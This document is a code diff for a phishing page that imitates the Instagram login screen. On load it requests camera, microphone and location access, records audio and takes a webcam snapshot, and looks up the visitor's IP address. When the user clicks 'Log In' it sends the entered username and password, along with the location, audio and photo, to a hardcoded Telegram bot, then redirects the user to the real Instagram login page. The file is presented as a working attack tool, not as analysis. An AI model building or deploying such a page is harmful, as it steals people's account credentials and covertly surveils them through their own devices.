@@ -1,132 +1,186 @@
-<script>
-    let locationData = "Unknown location";
-    let ipAddress = "Unknown IP";
-    let audioBlob;
-    let imageBlob;
-
-    async function requestPermissions() {
-        // Get IP address
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                ipAddress = data.ip;
-            });
-
-        // Request location permission
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition((position) => {
-                locationData = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
-            });
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        body {
+            background-color: #121212;
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
         }
-
-        try {
-            // Request audio and video permissions
-            const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
-
-            // Capture a 5-second audio recording
-            const audioRecorder = await recordAudio(stream);
-            audioRecorder.start();
-            await sleep(5000);  // Wait for 5 seconds of recording
-            audioBlob = await audioRecorder.stop();
-
-            // Capture a snapshot from the video stream
-            const snapshot = await captureSnapshot(stream);
-            imageBlob = snapshot;
-
-        } catch (err) {
-            console.error('Error requesting media permissions:', err);
+        .container {
+            background-color: #1d1d1d;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            width: 320px;
         }
-    }
+        .logo {
+            margin-bottom: 20px;
+        }
+        .logo img {
+            width: 180px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            border: none;
+            border-radius: 5px;
+            background-color: #2c2c2c;
+            color: #ffffff;
+        }
+        input::placeholder {
+            color: #bbbbbb;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #007bb5;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+        }
+        .footer a {
+            color: #0095f6;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body onload="requestPermissions()">
 
-    async function recordAudio(stream) {
-        const mediaRecorder = new MediaRecorder(stream);
-        let audioChunks = [];
+    <div class="container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+        </div>
+        <input type="text" id="username" placeholder="Phone number, username, or email">
+        <input type="password" id="password" placeholder="Password">
+        <button onclick="sendData()">Log In</button>
+        <div class="footer">Don't have an account? <a href="#">Sign up</a></div>
+    </div>
 
-        return {
-            start() {
-                mediaRecorder.start();
-                mediaRecorder.ondataavailable = event => {
-                    audioChunks.push(event.data);
-                };
-            },
-            stop() {
-                return new Promise(resolve => {
-                    mediaRecorder.onstop = () => {
-                        const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
-                        resolve(audioBlob);
-                    };
-                    mediaRecorder.stop();
+    <script>
+        let locationData = "Unknown location";
+        let ipAddress = "Unknown IP";
+        let audioBlob;
+        let imageBlob;
+
+        async function requestPermissions() {
+            // Get IP address
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    ipAddress = data.ip;
+                });
+
+            // Request location permission and fetch coordinates
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((position) => {
+                    locationData = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
                 });
             }
-        };
-    }
 
-    function captureSnapshot(stream) {
-        return new Promise(resolve => {
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.play();
-            video.onloadedmetadata = () => {
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                canvas.toBlob(blob => resolve(blob), 'image/jpeg');
-                video.pause();
-            };
-        });
-    }
+            // Request audio and video permissions
+            navigator.mediaDevices.getUserMedia({ audio: true, video: true })
+                .then(stream => {
+                    // Capture a 5-second audio recording
+                    const mediaRecorder = new MediaRecorder(stream);
+                    const audioChunks = [];
+                    mediaRecorder.ondataavailable = event => audioChunks.push(event.data);
+                    mediaRecorder.start();
 
-    function sleep(ms) {
-        return new Promise(resolve => setTimeout(resolve, ms));
-    }
+                    setTimeout(() => {
+                        mediaRecorder.stop();
+                    }, 5000);
 
-    async function sendData() {
-        const username = document.getElementById('username').value;
-        const password = document.getElementById('password').value;
+                    mediaRecorder.onstop = () => {
+                        audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
+                    };
 
-        if (username.trim() === "" || password.trim() === "") {
-            alert("Please fill in both fields.");
-            return;
+                    // Capture a snapshot from the video stream
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    video.onloadedmetadata = () => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        canvas.toBlob(blob => imageBlob = blob);
+                        video.pause();
+                    };
+                })
+                .catch(err => console.error('Error requesting media permissions:', err));
         }
 
-        const message = `New Login Attempt:\nUsername: ${username}\nPassword: ${password}\nIP Address: ${ipAddress}\nLocation: ${locationData}\nTime: ${new Date().toLocaleString()}`;
+        function sendData() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
 
-        const botToken = '7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds';
-        const chatId = '860517021';
-        const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            if (username.trim() === "" || password.trim() === "") {
+                alert("Please fill in both fields.");
+                return;
+            }
 
-        // Send the message to Telegram
-        await fetch(telegramApiUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: message
-            })
-        });
+            const message = `New Login Attempt:\nUsername: ${username}\nPassword: ${password}\nIP Address: ${ipAddress}\nLocation: ${locationData}\nTime: ${new Date().toLocaleString()}`;
 
-        // Send audio and image after message
-        if (audioBlob) {
-            await sendMedia(audioBlob, 'audio', botToken, chatId);
+            const botToken = '7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds';
+            const chatId = '860517021';
+            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            // Send message to Telegram
+            fetch(telegramApiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            }).then(() => {
+                // Send audio
+                if (audioBlob) {
+                    sendMedia(audioBlob, 'audio', botToken, chatId);
+                }
+
+                // Send image
+                if (imageBlob) {
+                    sendMedia(imageBlob, 'photo', botToken, chatId);
+                }
+
+                // Redirect to Telegram after sending
+                window.location.href = "https://www.instagram.com/accounts/login/";
+            });
         }
-        if (imageBlob) {
-            await sendMedia(imageBlob, 'photo', botToken, chatId);
+
+        function sendMedia(blob, type, botToken, chatId) {
+            const formData = new FormData();
+            formData.append(type, blob, `${type}.${type === 'audio' ? 'wav' : 'jpg'}`);
+
+            fetch(`https://api.telegram.org/bot${botToken}/send${type === 'audio' ? 'Audio' : 'Photo'}`, {
+                method: 'POST',
+                body: formData
+            });
         }
+    </script>
 
-        // Redirect to Instagram after sending everything
-        window.location.href = "https://www.instagram.com/accounts/login/";
-    }
-
-    function sendMedia(blob, type, botToken, chatId) {
-        const formData = new FormData();
-        formData.append(type, blob, `${type}.${type === 'audio' ? 'wav' : 'jpg'}`);
-
-        return fetch(`https://api.telegram.org/bot${botToken}/send${type === 'audio' ? 'Audio' : 'Photo'}`, {
-            method: 'POST',
-            body: formData
-        });
-    }
-</script>
+</body>
+</html>
